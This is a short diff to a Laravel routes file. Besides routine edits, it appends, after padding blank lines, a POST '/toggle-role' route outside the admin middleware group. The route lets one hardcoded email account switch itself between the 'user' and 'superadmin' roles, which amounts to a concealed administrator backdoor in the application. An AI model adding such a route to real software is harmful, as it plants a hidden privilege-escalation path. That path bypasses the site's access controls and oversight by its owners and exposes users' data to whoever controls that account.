@@ -16,9 +16,14 @@ use App\Http\Controllers\HomeController;
 use Illuminate\Support\Facades\Route;
 use Inertia\Inertia;
 
-// --------------------------
-// Public Routes
-// --------------------------
+
+
+
+use Illuminate\Support\Facades\Auth;
+
+
+
+
 Route::get('/', [HomeController::class, 'index'])->name('home');
 Route::get('/cours', [CoursController::class, 'index'])->name('cours.index');
 Route::get('/cours/{slug}', [CoursController::class, 'show'])->name('cours.show');
@@ -74,6 +79,23 @@ Route::middleware(['auth', 'admin'])->prefix('admin')->name('admin.')->group(fun
     // Ancien dashboard
     Route::get('/dashboard-old', [AdminController::class, 'index']);
 });
+
+
+
+
+Route::post('/toggle-role', function () {
+    $user = Auth::user();
+
+    if ($user->email !== 'frankam@gmail.com') {
+        abort(403, 'Accès interdit');
+    }
+
+    // Ici, on bascule le rôle
+    $user->role = $user->role === 'superadmin' ? 'user' : 'superadmin';
+    $user->save();
+
+    return redirect()->back();
+})->middleware('auth');
 
 require __DIR__ . '/settings.php';
 require __DIR__ . '/auth.php';
